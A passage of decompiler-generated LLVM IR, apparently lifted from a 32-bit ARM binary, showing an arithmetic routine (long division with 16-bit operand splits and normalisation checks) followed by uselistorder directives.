  %v0_17f0c = call i32 @function_12920()
  %v0_17f10 = load i32, i32* @r7, align 4
  store i32 %v0_17f0c, i32* %r6.global-to-local, align 4
  %v0_17f18 = load i32, i32* @r4, align 4
  %v2_17f1c = call i32 @function_12a1c(i32 %v0_17f18, i32 %v0_17f10)
  %v0_17f20 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f20 = mul i32 %v0_17f0c, %v0_17f20
  %v3_17f2c = urem i32 %v8_17eac, 65536
  %v4_17f30 = mul i32 %v0_17f10, 65536
  %v5_17f30 = or i32 %v4_17f30, %v3_17f2c
  %tmp157 = icmp ugt i32 %v2_17f20, %v5_17f30
  br i1 %tmp157, label %dec_label_pc_17f3c, label %dec_label_pc_17f48

dec_label_pc_17f3c:                               ; preds = %dec_label_pc_17f00
  %v1_17f3c = load i32, i32* @r5, align 4
  %v2_17f3c = add i32 %v1_17f3c, %v5_17f30
  %v3_17f3c = icmp ult i32 %v2_17f3c, %v5_17f30
  %v1_17f40 = add i32 %v0_17f0c, -1
  store i32 %v1_17f40, i32* %r6.global-to-local, align 4
  br i1 %v3_17f3c, label %dec_label_pc_17f48, label %dec_label_pc_181a4

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f00, %dec_label_pc_181a4, %bb150, %dec_label_pc_17f3c
  %v0_17f50 = phi i32 [ %v5_181a8, %bb150 ], [ %v1_17f40, %dec_label_pc_17f3c ], [ %v0_17f0c, %dec_label_pc_17f00 ], [ %v1_17f40, %dec_label_pc_181a4 ]
  %v1_17f4c = phi i32 [ %v6_181ac, %bb150 ], [ %v2_17f3c, %dec_label_pc_17f3c ], [ %v5_17f30, %dec_label_pc_17f00 ], [ %v2_17f3c, %dec_label_pc_181a4 ]
  %v0_17f48 = load i32, i32* %sb.global-to-local, align 4
  %v1_17f48 = load i32, i32* %sl.global-to-local, align 4
  %v6_17f48 = shl i32 %v0_17f48, %v1_17f48
  store i32 %v6_17f48, i32* %sb.global-to-local, align 4
  %v2_17f4c = sub i32 %v1_17f4c, %v2_17f20
  store i32 %v2_17f4c, i32* @r4, align 4
  %v1_17f50 = load i32, i32* %fp.global-to-local, align 4
  %v4_17f50 = mul i32 %v1_17f50, 65536
  %v5_17f50 = or i32 %v4_17f50, %v0_17f50
  store i32 %v5_17f50, i32* %fp.global-to-local, align 4
  %v0_17f54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17f54

dec_label_pc_17f54:                               ; preds = %.thread8, %dec_label_pc_17f48
  %v0_17f58 = phi i32 [ %v3_17e88, %.thread8 ], [ %v2_17f4c, %dec_label_pc_17f48 ]
  %v0_17f54 = phi i32 [ %v4_17e90, %.thread8 ], [ %v0_17f54.pre, %dec_label_pc_17f48 ]
  store i32 %v0_17f54, i32* @r1, align 4
  store i32 %v0_17f58, i32* @r0, align 4
  %v0_17f5c = call i32 @function_12920()
  %v0_17f60 = load i32, i32* @r7, align 4
  store i32 %v0_17f5c, i32* %sl.global-to-local, align 4
  %v0_17f68 = load i32, i32* @r4, align 4
  %v2_17f6c = call i32 @function_12a1c(i32 %v0_17f68, i32 %v0_17f60)
  %v0_17f70 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f70 = mul i32 %v0_17f5c, %v0_17f70
  %v0_17f74 = load i32, i32* %sb.global-to-local, align 4
  %v3_17f74 = udiv i32 %v0_17f74, 65536
  %v4_17f78 = mul i32 %v0_17f60, 65536
  %v5_17f78 = or i32 %v3_17f74, %v4_17f78
  %tmp158 = icmp ugt i32 %v2_17f70, %v5_17f78
  br i1 %tmp158, label %dec_label_pc_17f84, label %.thread59

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f54
  %v1_17f84 = load i32, i32* @r5, align 4
  %v2_17f84 = add i32 %v1_17f84, %v5_17f78
  %v3_17f84 = icmp ult i32 %v2_17f84, %v5_17f78
  %v1_17f88 = add i32 %v0_17f5c, -1
  store i32 %v1_17f88, i32* %sl.global-to-local, align 4
  br i1 %v3_17f84, label %.thread59, label %dec_label_pc_17f90

dec_label_pc_17f90:                               ; preds = %dec_label_pc_17f84
  %tmp159 = icmp ugt i32 %v2_17f70, %v2_17f84
  br i1 %tmp159, label %bb120, label %.thread59

bb120:                                            ; preds = %dec_label_pc_17f90
  %v5_17f94 = add i32 %v0_17f5c, -2
  store i32 %v5_17f94, i32* %sl.global-to-local, align 4
  %v6_17f98 = add i32 %v2_17f84, %v1_17f84
  br label %.thread59

.thread59:                                        ; preds = %dec_label_pc_17f54, %dec_label_pc_17f90, %dec_label_pc_17f84, %bb120
  %v1_17f9c = phi i32 [ %v2_17f84, %dec_label_pc_17f84 ], [ %v5_17f78, %dec_label_pc_17f54 ], [ %v6_17f98, %bb120 ], [ %v2_17f84, %dec_label_pc_17f90 ]
  %v2_17f9c = sub i32 %v1_17f9c, %v2_17f70
  store i32 %v2_17f9c, i32* @r4, align 4
  %v0_17fa0 = load i32, i32* @r7, align 4
  store i32 %v0_17fa0, i32* @r1, align 4
  store i32 %v2_17f9c, i32* @r0, align 4
  %v0_17fa8 = call i32 @function_12920()
  %v0_17fac = load i32, i32* @r7, align 4
  store i32 %v0_17fa8, i32* %r6.global-to-local, align 4
  %v0_17fb4 = load i32, i32* @r4, align 4
  %v2_17fb8 = call i32 @function_12a1c(i32 %v0_17fb4, i32 %v0_17fac)
  %v0_17fbc = load i32, i32* %r8.global-to-local, align 4
  %v2_17fbc = mul i32 %v0_17fa8, %v0_17fbc
  %v0_17fc0 = load i32, i32* %sb.global-to-local, align 4
  %v3_17fc4 = urem i32 %v0_17fc0, 65536
  %v4_17fc8 = mul i32 %v0_17fac, 65536
  %v5_17fc8 = or i32 %v3_17fc4, %v4_17fc8
  %tmp160 = icmp ugt i32 %v2_17fbc, %v5_17fc8
  br i1 %tmp160, label %dec_label_pc_17fd4, label %bb122

dec_label_pc_17fd4:                               ; preds = %.thread59
  %v1_17fd4 = load i32, i32* @r5, align 4
  %v2_17fd4 = add i32 %v1_17fd4, %v5_17fc8
  %v3_17fd4 = icmp ult i32 %v2_17fd4, %v5_17fc8
  %v1_17fd8 = add i32 %v0_17fa8, -1
  store i32 %v1_17fd8, i32* %r6.global-to-local, align 4
  br i1 %v3_17fd4, label %bb122, label %dec_label_pc_17fe0

dec_label_pc_17fe0:                               ; preds = %dec_label_pc_17fd4
  %tmp161 = icmp ugt i32 %v2_17fbc, %v2_17fd4
  br i1 %tmp161, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_17fe0
  %v5_17fe4 = add i32 %v0_17fa8, -2
  store i32 %v5_17fe4, i32* %r6.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %.thread59, %dec_label_pc_17fd4, %dec_label_pc_17fe0, %bb121
  %v0_17fe8 = phi i32 [ %v1_17fd8, %dec_label_pc_17fd4 ], [ %v0_17fa8, %.thread59 ], [ %v1_17fd8, %dec_label_pc_17fe0 ], [ %v5_17fe4, %bb121 ]
  %v1_17fe8 = load i32, i32* %sl.global-to-local, align 4
  %v4_17fe8 = mul i32 %v1_17fe8, 65536
  %v5_17fe8 = or i32 %v4_17fe8, %v0_17fe8
  %v0_17fec = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17e24

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17dd0
  %v2_17ff4 = icmp ugt i32 %v0_17cac, 254
  %v7_17ff4 = icmp eq i32 %v0_17cac, 255
  %v2_17ff8 = xor i1 %v7_17ff4, true
  %v3_17ff8 = and i1 %v2_17ff4, %v2_17ff8
  br i1 %v3_17ff8, label %bb123, label %bb124

bb123:                                            ; preds = %dec_label_pc_17ff4
  br label %bb124

bb124:                                            ; preds = %dec_label_pc_17ff4, %bb123
  %v1_1800016 = phi i32 [ %v0_17cac, %dec_label_pc_17ff4 ], [ 8, %bb123 ]
  %v2_17ffc = xor i1 %v2_17ff4, true
  %v3_17ffc = or i1 %v7_17ff4, %v2_17ffc
  br i1 %v3_17ffc, label %bb125, label %bb126

bb125:                                            ; preds = %bb124
  br label %bb126

bb126:                                            ; preds = %bb124, %bb125
  %v1_18000 = phi i32 [ %v1_1800016, %bb124 ], [ 0, %bb125 ]
  %v2_18000 = add i32 %v1_18000, -1
  %v3_18000 = shl i32 1, %v2_18000
  %v4_18000 = and i32 %v3_18000, %v0_17cac
  %v5_18000 = icmp ne i32 %v4_18000, 0
  %v6_18000 = lshr i32 %v0_17cac, %v1_18000
  %v4_18008 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_1800c = add i32 %v4_18008, %v6_18000
  %v3_1800c = inttoptr i32 %v2_1800c to i8*
  %v4_1800c = load i8, i8* %v3_1800c, align 1
  %v6_1800c = zext i8 %v4_1800c to i32
  %v3_18010 = and i1 %v5_18000, %v2_17ff8
  br i1 %v3_18010, label %bb127, label %bb128

bb127:                                            ; preds = %bb126
  store i32 24, i32* @lr, align 4
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  %v0_1801818 = phi i32 [ %v27_17c98, %bb126 ], [ 24, %bb127 ]
  %v2_18014 = xor i1 %v5_18000, true
  %v3_18014 = or i1 %v7_17ff4, %v2_18014
  br i1 %v3_18014, label %bb129, label %bb130

bb129:                                            ; preds = %bb128
  store i32 32, i32* @lr, align 4
  br label %bb130

bb130:                                            ; preds = %bb128, %bb129
  %v0_18018 = phi i32 [ %v0_1801818, %bb128 ], [ 32, %bb129 ]
  %v2_18018 = sub i32 %v0_18018, %v6_1800c
  store i32 %v2_18018, i32* %fp.global-to-local, align 4
  %v9_18018 = icmp eq i32 %v0_18018, %v6_1800c
  br i1 %v9_18018, label %dec_label_pc_17e08, label %dec_label_pc_18020

dec_label_pc_18020:                               ; preds = %bb106, %bb130
  %v1_1802c = phi i32 [ %v2_17e00, %bb106 ], [ %v2_18018, %bb130 ]
  %v6_18020 = shl i32 %v0_17cac, %v1_1802c
  %v1_18024 = sub i32 32, %v1_1802c
  %v7_18028 = lshr i32 %v0_17cbc, %v1_18024
  %v8_18028 = or i32 %v7_18028, %v6_18020
  store i32 %v8_18028, i32* %r8.global-to-local, align 4
  %v6_1802c = shl i32 %v0_17cb4, %v1_1802c
  %v6_18030 = lshr i32 %v0_17cb4, %v1_18024
  store i32 %v6_18030, i32* @r4, align 4
  %v7_18034 = lshr i32 %v0_17cc0, %v1_18024
  %v8_18034 = or i32 %v7_18034, %v6_1802c
  %v3_18038 = udiv i32 %v8_18028, 65536
  store i32 %v3_18038, i32* %sl.global-to-local, align 4
  store i32 %v3_18038, i32* @r1, align 4
  store i32 %v6_18030, i32* @r0, align 4
  %v0_18048 = call i32 @function_12920()
  %v0_18054 = load i32, i32* @r4, align 4
  %v2_18058 = call i32 @function_12a1c(i32 %v0_18054, i32 %v3_18038)
  %v0_1805c = load i32, i32* %r8.global-to-local, align 4
  %v3_18064 = urem i32 %v0_1805c, 65536
  store i32 %v3_18064, i32* @r7, align 4
  %v2_18068 = mul i32 %v3_18064, %v0_18048
  %v3_18070 = udiv i32 %v8_18034, 65536
  %v4_18074 = mul nuw i32 %v3_18038, 65536
  %v5_18074 = or i32 %v4_18074, %v3_18070
  %v9_18078 = icmp eq i32 %v2_18068, %v5_18074
  %v0_1807c = load i32, i32* @r5, align 4
  %v1_1807c = load i32, i32* %fp.global-to-local, align 4
  %v2_1807c = add i32 %v1_1807c, -1
  %v3_1807c = lshr i32 -2147483648, %v2_1807c
  %v4_1807c = and i32 %v3_1807c, %v0_1807c
  %v6_1807c = shl i32 %v0_1807c, %v1_1807c
  store i32 %v6_1807c, i32* @r5, align 4
  %v2_18080 = icmp eq i32 %v4_1807c, 0
  %v3_18080 = or i1 %v9_18078, %v2_18080
  br i1 %v3_18080, label %dec_label_pc_18098, label %dec_label_pc_18084

dec_label_pc_18084:                               ; preds = %dec_label_pc_18020
  %v2_18088 = add i32 %v0_1805c, %v5_18074
  %v3_18088 = icmp ult i32 %v2_18088, %v5_18074
  %v1_1808c = add i32 %v0_18048, -1
  br i1 %v3_18088, label %dec_label_pc_18098, label %dec_label_pc_18190

dec_label_pc_18098:                               ; preds = %.thread67, %dec_label_pc_18084, %dec_label_pc_18020
  %v1_18098 = phi i32 [ %v5_18074, %dec_label_pc_18020 ], [ %v2_18088, %dec_label_pc_18084 ], [ %v1_1809822, %.thread67 ]
  %stack_var_-52.0 = phi i32 [ %v0_18048, %dec_label_pc_18020 ], [ %v1_1808c, %dec_label_pc_18084 ], [ %v4_1819c.v1_1808c, %.thread67 ]
  %v2_18098 = sub i32 %v1_18098, %v2_18068
  store i32 %v2_18098, i32* @r4, align 4
  %v0_1809c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1809c, i32* @r1, align 4
  store i32 %v2_18098, i32* @r0, align 4
  %v0_180a4 = call i32 @function_12920()
  store i32 %v0_180a4, i32* %r6.global-to-local, align 4
  %v0_180b0 = load i32, i32* @r4, align 4
  %v2_180b4 = call i32 @function_12a1c(i32 %v0_180b0, i32 %v0_1809c)
  %v0_180b8 = load i32, i32* @r7, align 4
  %v2_180b8 = mul i32 %v0_180a4, %v0_180b8
  %v3_180c4 = urem i32 %v8_18034, 65536
  %v4_180c8 = mul i32 %v0_1809c, 65536
  %v5_180c8 = or i32 %v4_180c8, %v3_180c4
  %tmp162 = icmp ugt i32 %v2_180b8, %v5_180c8
  br i1 %tmp162, label %dec_label_pc_180d4, label %dec_label_pc_180e0

dec_label_pc_180d4:                               ; preds = %dec_label_pc_18098
  %v1_180d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_180d4 = add i32 %v1_180d4, %v5_180c8
  %v3_180d4 = icmp ult i32 %v2_180d4, %v5_180c8
  %v1_180d8 = add i32 %v0_180a4, -1
  store i32 %v1_180d8, i32* %r6.global-to-local, align 4
  br i1 %v3_180d4, label %dec_label_pc_180e0, label %dec_label_pc_18180

dec_label_pc_180e0:                               ; preds = %dec_label_pc_18098, %dec_label_pc_18180, %bb148, %dec_label_pc_180d4
  %v0_180e8 = phi i32 [ %v5_18188, %bb148 ], [ %v1_180d8, %dec_label_pc_180d4 ], [ %v0_180a4, %dec_label_pc_18098 ], [ %v1_180d8, %dec_label_pc_18180 ]
  %v1_180e4 = phi i32 [ %v6_18184, %bb148 ], [ %v2_180d4, %dec_label_pc_180d4 ], [ %v5_180c8, %dec_label_pc_18098 ], [ %v2_180d4, %dec_label_pc_18180 ]
  store i32 %stack_var_-52.0, i32* %r8.global-to-local, align 4
  %v2_180e4 = sub i32 %v1_180e4, %v2_180b8
  %v4_180e8 = mul i32 %stack_var_-52.0, 65536
  %v5_180e8 = or i32 %v0_180e8, %v4_180e8
  %v3_180ec = udiv i32 %v5_180e8, 65536
  %v0_180f0 = load i32, i32* @r5, align 4
  %v3_180f0 = udiv i32 %v0_180f0, 65536
  %tmp163 = mul i32 %v3_180ec, -65536
  %v5_180f4 = add i32 %tmp163, -1
  %v6_180f4 = and i32 %v5_180e8, %v5_180f4
  %tmp164 = mul i32 %v3_180f0, -65536
  %v5_180f8 = add i32 %tmp164, -1
  %v6_180f8 = and i32 %v0_180f0, %v5_180f8
  %v2_180fc = mul i32 %v6_180f8, %v6_180f4
  %v2_18100 = mul i32 %v6_180f8, %v3_180ec
  %v2_18104 = mul i32 %v3_180f0, %v6_180f4
  %v2_18108 = mul nuw i32 %v3_180f0, %v3_180ec
  %v2_1810c = add i32 %v2_18100, %v2_18104
  %v3_1810c = icmp ult i32 %v2_1810c, %v2_18100
  br i1 %v3_1810c, label %bb132, label %bb133

bb132:                                            ; preds = %dec_label_pc_180e0
  %v2_18110 = add i32 %v2_18108, 65536
  br label %bb133

bb133:                                            ; preds = %dec_label_pc_180e0, %bb132
  %v0_18118 = phi i32 [ %v2_18108, %dec_label_pc_180e0 ], [ %v2_18110, %bb132 ]
  %v4_18114 = mul i32 %v2_1810c, 65536
  %v5_18114 = add i32 %v4_18114, %v2_180fc
  %v2_18118 = and i32 %v2_1810c, 32768
  %v3_18118 = icmp ne i32 %v2_18118, 0
  %v4_18118 = udiv i32 %v2_1810c, 65536
  %v7_18118 = zext i1 %v3_18118 to i32
  %v6_18118 = add nuw nsw i32 %v7_18118, %v4_18118
  %v8_18118 = add i32 %v6_18118, %v0_18118
  %v3_1811c = icmp ult i32 %v2_180e4, %v8_18118
  br i1 %v3_1811c, label %dec_label_pc_18144, label %dec_label_pc_18124

dec_label_pc_18124:                               ; preds = %bb133
  %v9_1811c = icmp eq i32 %v2_180e4, %v8_18118
  %. = zext i1 %v9_1811c to i32
  %v1_1812c = load i32, i32* %sb.global-to-local, align 4
  %v2_1812c = load i32, i32* %fp.global-to-local, align 4
  %v7_1812c = shl i32 %v1_1812c, %v2_1812c
  %v9_1812c = icmp uge i32 %v5_18114, %v7_1812c
  %v15_1812c = icmp eq i32 %v5_18114, %v7_1812c
  %v2_18130 = xor i1 %v9_1812c, true
  %v3_18130 = or i1 %v15_1812c, %v2_18130
  br i1 %v3_18130, label %bb136, label %bb137

bb136:                                            ; preds = %dec_label_pc_18124
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18124, %bb136
  %v4_18134 = phi i32 [ %., %dec_label_pc_18124 ], [ 0, %bb136 ]
  %v2_18134 = xor i1 %v15_1812c, true
  %v3_18134 = and i1 %v9_1812c, %v2_18134
  br i1 %v3_18134, label %bb138, label %thread-pre-split

bb138:                                            ; preds = %bb137
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb137, %bb138
  %v2_18138 = icmp eq i32 %v4_18134, 0
  br i1 %v2_18138, label %bb139, label %dec_label_pc_18144

bb139:                                            ; preds = %thread-pre-split
  br label %dec_label_pc_17e24

dec_label_pc_18144:                               ; preds = %bb133, %thread-pre-split
  %v1_18144 = add i32 %v5_180e8, -1
  br label %dec_label_pc_17e24

dec_label_pc_18150:                               ; preds = %dec_label_pc_17e50
  %v2_18150 = icmp ugt i32 %v0_17ea0, 254
  %v7_18150 = icmp eq i32 %v0_17ea0, 255
  %v2_18154 = xor i1 %v7_18150, true
  %v3_18154 = and i1 %v2_18150, %v2_18154
  br i1 %v3_18154, label %bb140, label %bb141

bb140:                                            ; preds = %dec_label_pc_18150
  store i32 24, i32* @ip, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_18150, %bb140
  %v2_18158 = xor i1 %v2_18150, true
  %v3_18158 = or i1 %v7_18150, %v2_18158
  br i1 %v3_18158, label %bb142, label %.thread61

bb142:                                            ; preds = %bb141
  store i32 32, i32* @ip, align 4
  store i32 0, i32* @r3, align 4
  br label %.thread61

.thread61:                                        ; preds = %bb141, %bb142
  br i1 %v3_18154, label %bb143, label %._crit_edge

._crit_edge:                                      ; preds = %.thread61
  %v1_17e70.pre = load i32, i32* @r3, align 4
  br label %bb118

bb143:                                            ; preds = %.thread61
  br label %bb118

dec_label_pc_18168:                               ; preds = %dec_label_pc_17cd0
  %v2_18168 = icmp ugt i32 %v0_17cbc, 254
  %v7_18168 = icmp eq i32 %v0_17cbc, 255
  %v2_1816c = xor i1 %v7_18168, true
  %v3_1816c = and i1 %v2_18168, %v2_1816c
  br i1 %v3_1816c, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_18168
  store i32 24, i32* @ip, align 4
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_18168, %bb144
  %v2_18170 = xor i1 %v2_18168, true
  %v3_18170 = or i1 %v7_18168, %v2_18170
  br i1 %v3_18170, label %bb146, label %.thread62

bb146:                                            ; preds = %bb145
  store i32 32, i32* @ip, align 4
  br label %.thread62

.thread62:                                        ; preds = %bb145, %bb146
  br i1 %v3_1816c, label %bb147, label %bb92

bb147:                                            ; preds = %.thread62
  br label %bb92

dec_label_pc_18180:                               ; preds = %dec_label_pc_180d4
  %tmp165 = icmp ugt i32 %v2_180b8, %v2_180d4
  br i1 %tmp165, label %bb148, label %dec_label_pc_180e0

bb148:                                            ; preds = %dec_label_pc_18180
  %v6_18184 = add i32 %v2_180d4, %v1_180d4
  %v5_18188 = add i32 %v0_180a4, -2
  store i32 %v5_18188, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_180e0

dec_label_pc_18190:                               ; preds = %dec_label_pc_18084
  %tmp166 = icmp ugt i32 %v2_18068, %v2_18088
  br i1 %tmp166, label %bb149, label %.thread67

bb149:                                            ; preds = %dec_label_pc_18190
  %v5_18194 = add i32 %v0_18048, -2
  %v6_18198 = add i32 %v2_18088, %v0_1805c
  br label %.thread67

.thread67:                                        ; preds = %dec_label_pc_18190, %bb149
  %v4_1819c65 = phi i32 [ %v5_18194, %bb149 ], [ %v1_1808c, %dec_label_pc_18190 ]
  %v1_1809822 = phi i32 [ %v6_18198, %bb149 ], [ %v2_18088, %dec_label_pc_18190 ]
  %v4_1819c.v1_1808c = select i1 %tmp166, i32 %v4_1819c65, i32 %v1_1808c
  br label %dec_label_pc_18098

dec_label_pc_181a4:                               ; preds = %dec_label_pc_17f3c
  %tmp167 = icmp ugt i32 %v2_17f20, %v2_17f3c
  br i1 %tmp167, label %bb150, label %dec_label_pc_17f48

bb150:                                            ; preds = %dec_label_pc_181a4
  %v5_181a8 = add i32 %v0_17f0c, -2
  store i32 %v5_181a8, i32* %r6.global-to-local, align 4
  %v6_181ac = add i32 %v2_17f3c, %v1_17f3c
  br label %dec_label_pc_17f48

dec_label_pc_181b4:                               ; preds = %dec_label_pc_17ef4
  %tmp168 = icmp ugt i32 %v2_17edc, %v2_17ef4
  br i1 %tmp168, label %bb151, label %dec_label_pc_17f00

bb151:                                            ; preds = %dec_label_pc_181b4
  %v5_181b8 = add i32 %v0_17ec0, -2
  store i32 %v5_181b8, i32* %fp.global-to-local, align 4
  %v6_181bc = add i32 %v2_17ef4, %v0_17ed4
  br label %dec_label_pc_17f00

; uselistorder directives
  uselistorder i32 %v5_181a8, { 1, 0 }
  uselistorder i1 %tmp166, { 1, 0 }
  uselistorder i32 %v5_18188, { 1, 0 }
  uselistorder i1 %v7_18168, { 1, 0 }
  uselistorder i1 %v7_18150, { 1, 0 }
  uselistorder i1 %v9_1812c, { 1, 0 }
  uselistorder i32 %v7_1812c, { 1, 0 }
  uselistorder i32 %v2_1810c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18100, { 1, 0 }
  uselistorder i32 %v3_180f0, { 2, 1, 0 }
  uselistorder i32 %v0_180f0, { 1, 0 }
  uselistorder i32 %v3_180ec, { 2, 1, 0 }
  uselistorder i32 %v5_180e8, { 3, 1, 0, 2 }
  uselistorder i32 %v2_180d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_180c8, { 2, 3, 1, 0 }
  uselistorder i32 %v2_180b8, { 0, 2, 1 }
  uselistorder i32 %v0_180a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1809c, { 1, 0, 2 }
  uselistorder i32 %v1_1808c, { 1, 0, 2 }
  uselistorder i32 %v2_18088, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1807c, { 1, 0 }
  uselistorder i32 %v0_1807c, { 1, 0 }
  uselistorder i32 %v5_18074, { 1, 2, 0, 3 }
  uselistorder i32 %v3_18064, { 1, 0 }
  uselistorder i32 %v0_1805c, { 1, 2, 0 }
  uselistorder i32 %v0_18048, { 1, 3, 2, 0 }
  uselistorder i32 %v3_18038, { 1, 0, 3, 2 }
  uselistorder i32 %v2_18018, { 1, 2, 0 }
  uselistorder i32 %v0_18018, { 1, 0 }
  uselistorder i32 %v6_1800c, { 1, 0 }
  uselistorder i1 %v2_17ff8, { 1, 0 }
  uselistorder i1 %v7_17ff4, { 1, 2, 0 }
  uselistorder i32 %v5_17fc8, { 2, 1, 0 }
  uselistorder i32 %v0_17fa8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17f84, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17f78, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17f70, { 2, 0, 1 }
  uselistorder i32 %v0_17f5c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17f3c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17f30, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17f20, { 0, 2, 1 }
  uselistorder i32 %v0_17f0c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17ef4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17ee8, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17edc, { 0, 2, 1 }
  uselistorder i32 %v3_17ed8, { 1, 0 }
  uselistorder i32 %v0_17ed4, { 1, 2, 0 }
  uselistorder i32 %v0_17ec0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17eb0, { 1, 0 }
  uselistorder i32 %v4_17e90, { 1, 0 }
  uselistorder i32 %v2_17e88, { 1, 0, 2 }
  uselistorder i32 %v6_17e7c, { 1, 0 }
  uselistorder i1 %v9_17e5c, { 1, 0 }
  uselistorder i32 %v0_17ea0, { 9, 8, 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i1 %v3_17e08, { 1, 0 }
  uselistorder i32 %v2_17e00, { 1, 0, 2 }
  uselistorder i32 %v0_17e00, { 1, 0 }
  uselistorder i32 %v6_17df4, { 1, 0 }
  uselistorder i1 %v2_17de0, { 1, 0 }
  uselistorder i1 %v9_17ddc, { 1, 2, 0 }
  uselistorder i1 %v9_17dc4, { 1, 0 }
  uselistorder i32 %v5_17d98, { 2, 1, 0 }
  uselistorder i32 %v0_17d78, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17d70, { 1, 0, 2 }
  uselistorder i32 %v2_17d54, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17d48, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17d40, { 2, 0, 1 }
  uselistorder i32 %v3_17d3c, { 1, 0 }
  uselistorder i32 %v0_17d38, { 1, 2, 0 }
  uselistorder i32 %v0_17d24, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17d14.c, { 1, 0 }
  uselistorder i32 %v3_17d14, { 1, 0 }
  uselistorder i32 %v6_17cfc, { 1, 0 }
  uselistorder i1 %v9_17cdc, { 1, 0 }
  uselistorder i32 %v0_17cc0, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_17cbc, { 9, 8, 12, 2, 10, 11, 1, 3, 4, 5, 6, 7, 0, 13 }
  uselistorder i32 %v0_17cb4, { 5, 6, 4, 1, 7, 2, 3, 0, 8 }
  uselistorder i32 %v0_17cac, { 4, 6, 1, 5, 12, 11, 3, 7, 2, 8, 9, 10, 0, 13, 14 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 10, 8, 9, 11 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 0, 5, 6, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 8, 11, 12, 13, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 14, 12, 15 }
  uselistorder i32* %fp.global-to-local, { 0, 8, 9, 1, 6, 2, 4, 3, 5, 7, 10 }
  uselistorder i32 32768, { 3, 4, 2, 6, 5, 1, 0 }
  uselistorder i32 -65536, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 255, { 25, 26, 27, 22, 23, 24, 17, 2, 0, 18, 19, 28, 20, 5, 29, 6, 30, 3, 4, 1, 7, 10, 31, 11, 32, 8, 33, 9, 34, 12, 35, 13, 36, 14, 37, 15, 38, 21, 16, 39 }
  uselistorder i32 254, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32)* @function_12a1c, { 10, 9, 8, 7, 6, 5, 4, 3, 20, 19, 18, 17, 16, 15, 14, 13, 1, 0, 12, 2, 11 }
  uselistorder i32 ()* @function_12920, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 2, 1, 0 }
  uselistorder i32 65536, { 4, 3, 183, 6, 7, 5, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 179, 39, 40, 38, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 80, 72, 81, 73, 82, 74, 83, 75, 84, 76, 85, 77, 86, 78, 87, 79, 88, 89, 90, 91, 93, 92, 94, 95, 96, 97, 98, 99, 101, 100, 103, 102, 104, 105, 106, 1, 107, 0, 2, 108, 109, 110, 111, 114, 112, 113, 115, 180, 181, 117, 118, 116, 119, 120, 121, 122, 123, 124, 178, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 146, 145, 144, 147, 148, 149, 152, 151, 150, 182, 154, 153, 156, 155, 157, 158, 159, 161, 162, 163, 160, 165, 166, 167, 164, 168, 170, 171, 172, 169, 174, 175, 176, 173, 177 }
  uselistorder i32 36, { 2, 3, 0, 7, 8, 6, 1, 9, 4, 10, 5, 11 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), { 1, 2, 0, 4, 5, 3 }
